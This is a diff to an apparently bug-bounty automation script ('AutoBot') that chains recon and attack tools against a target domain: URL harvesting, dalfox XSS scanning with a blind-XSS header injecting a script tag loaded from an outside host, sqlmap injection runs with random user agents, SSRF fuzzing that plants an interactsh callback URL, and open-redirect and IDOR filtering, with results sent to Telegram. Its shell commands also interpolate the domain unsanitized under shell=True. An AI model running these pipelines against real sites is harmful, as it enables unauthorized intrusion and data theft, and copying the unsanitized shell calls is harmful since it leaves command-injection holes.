@@ -20,13 +20,13 @@ TELEGRAMTokens = False
 TELEGRAM_KEYS = {}
 ###
 
-def executeCommand(COMMAND, verbose=False):
+def executeCommand(COMMAND, CallerFunc, verbose=False):
     try:
         subprocess.run(COMMAND, shell=True, check=True, text=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
         if verbose:
             print("\t"+co.bullets.OK, co.colors.GREEN+"Command Executed Successfully."+co.END)
     except subprocess.CalledProcessError as e:
-        print("\t"+co.bullets.ERROR, co.colors.BRED+"Error During Command Execution.!!"+co.END)
+        print("\t"+co.bullets.ERROR, co.colors.BRED+"{} : Error During Command Execution.!!".format(CallerFunc)+co.END)
         print(e.output)
     return 
 
@@ -45,14 +45,15 @@ def CompressFile(FName, Files):
 
 def CollectURLS(Domain):
     # collecting urls using waybackurls 
+    CallerFunc = "ColllectURLS"
     COMMAND = 'echo {} | waybackurls | egrep -v ".css|.png|.jpeg|.jpg|.svg|.gif|.ttf|.woff|.woff2|.eot|.otf|.ico|.js" >> temp_urls.txt'.format(Domain)
-    executeCommand(COMMAND)
+    executeCommand(COMMAND, CallerFunc)
     ## Collecting urls from gau
     COMMAND = 'gau -b css,png,jpeg,jpg,svg,gif,ttf,woff,woff2,eot,otf,ico,js {} | anew -q temp_urls.txt'.format(Domain)
-    executeCommand(COMMAND)
+    executeCommand(COMMAND, CallerFunc)
     # use qsreplace to remove duplicates 
     COMMAND = 'cat temp_urls.txt | sed -e "s/=.*/=/" -e "s/URL: //" | qsreplace -a >> urls.txt 2>&1'
-    executeCommand(COMMAND)
+    executeCommand(COMMAND, CallerFunc)
     # deleting extra file 
     os.remove("temp_urls.txt")
     # count number of lines 
@@ -63,23 +64,24 @@ def CollectURLS(Domain):
         NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : {} URLs collected for {}".format(numOfLines, Domain))
 
 def XSSAttack(Domain, BlindXSS=None):
+    CallerFunc = "XSSAttack"
     global TELEGRAMTokens
     global TELEGRAM_KEYS
     if TELEGRAMTokens:
         NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : XSS Scan Started on target {}".format(Domain))
     COMMAND = 'cat urls.txt | gf xss | httpx -mc 200,201,202,300,301,302 -silent >> xss_urls.txt'
-    executeCommand(COMMAND)
+    executeCommand(COMMAND, CallerFunc)
     if BlindXSS:
         # checking xss using dalfox including blind xss
         COMMAND = 'dalfox file xss_urls.txt -b {} -o xss_dalfox.txt -H \"referrer: xxx\'><script src=//{}></script>\" 2>&1 /dev/null'.format(BlindXSS, BlindXSS)
-        executeCommand(COMMAND)
+        executeCommand(COMMAND, CallerFunc)
     else:
         # checking xss using dalfox for stored and reflected xss
         COMMAND = 'dalfox file xss_urls.txt -o xss_dalfox.txt 2>&1 /dev/null'
-        executeCommand(COMMAND)
+        executeCommand(COMMAND, CallerFunc)
     # checking with kxss
     COMMAND = 'cat xss_urls.txt | kxss >> xss_kxss.txt 2>&1 /dev/null'
-    executeCommand(COMMAND)
+    executeCommand(COMMAND, CallerFunc)
     # compress files 
     FName = "{}_xss.zip".format(Domain)
     if os.path.isfile("xss_dalfox.txt") and os.path.isfile("xss_kxss.txt"):
@@ -107,13 +109,14 @@ def XSSAttack(Domain, BlindXSS=None):
                 NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : XSS Scan Result file {} is bigger then 50MB!!, Download it manually from Server ℹ️".format(FName))
 
 def SQLInjection(Domain):
+    CallerFunc = "SQLInjection"  
     global TELEGRAMTokens
     global TELEGRAM_KEYS
     if TELEGRAMTokens:
         NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : SQLi Scan Started on target {}".format(Domain))
-    executeCommand('cat urls.txt | gf sqli | httpx -mc 200,201,202,300,301,302 -silent >> sqli_urls.txt 2>&1 /dev/null')
+    executeCommand('cat urls.txt | gf sqli | httpx -mc 200,201,202,300,301,302 -silent >> sqli_urls.txt 2>&1 /dev/null', CallerFunc)
     # perform sql injection attack on target 
-    executeCommand('sqlmap -m sqli_urls.txt --batch --random-agent --level 1 >> sqli_result.txt 2>&1 /dev/null')
+    executeCommand('sqlmap -m sqli_urls.txt --batch --random-agent --level 1 >> sqli_result.txt 2>&1 /dev/null', CallerFunc)
     # compress files 
     FName = "{}_sqli.zip".format(Domain)
     if os.path.isfile("sqli_result.txt"):
@@ -132,14 +135,15 @@ def SQLInjection(Domain):
                 NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : SQLi Scan Result file {} is bigger then 50MB!!, Download it manually from Server ℹ️".format(FName))
 
 def SSRFScan(Domain, InteractSH):
+    CallerFunc = "SSRFScan"
     global TELEGRAMTokens
     global TELEGRAM_KEYS
     if TELEGRAMTokens:
         NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : SSRF Scan Started on target {}".format(Domain))
-    executeCommand('cat urls.txt | gf ssrf | httpx -mc 200,201,202,300,301,302 -silent >> ssrf_urls.txt')
+    executeCommand('cat urls.txt | gf ssrf | httpx -mc 200,201,202,300,301,302 -silent >> ssrf_urls.txt', CallerFunc)
     COMMAND = 'cat ssrf_urls.txt | qsreplace "https://{}" >> ssrf_paylod_urls.txt 2>&1 /dev/null'.format(InteractSH)
-    executeCommand(COMMAND)
-    executeCommand('ffuf -c -w ssrf_paylod_urls.txt -u FUZZ -o ssrf_fuzz_result.txt 2>&1 /dev/null')
+    executeCommand(COMMAND, CallerFunc)
+    executeCommand('ffuf -c -w ssrf_paylod_urls.txt -u FUZZ -o ssrf_fuzz_result.txt 2>&1 /dev/null', CallerFunc)
     # cleaning extra files
     os.remove("ssrf_urls.txt")
     os.remove("ssrf_paylod_urls.txt")
@@ -148,11 +152,12 @@ def SSRFScan(Domain, InteractSH):
         NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : Check Your intactsh instance for any Hit!!")
 
 def OpenRedirect(Domain):
+    CallerFunc = "OpenRedirect"
     global TELEGRAMTokens
     global TELEGRAM_KEYS
     if TELEGRAMTokens:
         NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : Open-Redirect Started on target {}".format(Domain))
-    executeCommand('cat urls.txt | gf redirect | httpx -mc 200,201,202,300,301,302 -silent >> openredirect_urls.txt')
+    executeCommand('cat urls.txt | gf redirect | httpx -mc 200,201,202,300,301,302 -silent >> openredirect_urls.txt', CallerFunc)
     # compress files 
     FName = "{}_openRedirect.zip".format(Domain)
     if os.path.isfile("openredirect_urls.txt"):
@@ -170,11 +175,12 @@ def OpenRedirect(Domain):
                 NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : OpenRedirect Scan Result file {} is bigger then 50MB!!, Download it manually from Server ℹ️".format(FName))
     
 def IDORScan(Domain):
+    CallerFunc = "IDORScan"
     global TELEGRAMTokens
     global TELEGRAM_KEYS
     if TELEGRAMTokens:
         NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : IDORScan Started on target {}".format(Domain))
-    executeCommand('cat urls.txt | gf idor | httpx -mc 200,201,202,300,301,302 -silent >> idor_urls.txt')
+    executeCommand('cat urls.txt | gf idor | httpx -mc 200,201,202,300,301,302 -silent >> idor_urls.txt', CallerFunc)
     # compress files 
     FName = "{}_idor.zip".format(Domain)
     if os.path.isfile("idor_urls.txt"):
@@ -354,6 +360,8 @@ def main():
         print(co.bullets.DONE+co.colors.GREEN+" Resultfile : {}".format(OPDir)+co.END)
         spinner.start()
     spinner.stop()
+    if TELEGRAMTokens:
+        NotifyBot(TELEGRAM_KEYS, "✅ AutoBot Scan Completed for : {}".format(tDomain))
     print(co.bullets.DONE+co.colors.GREEN+" AutoBot Scan Completed."+co.END)
 
 if __name__ == "__main__":
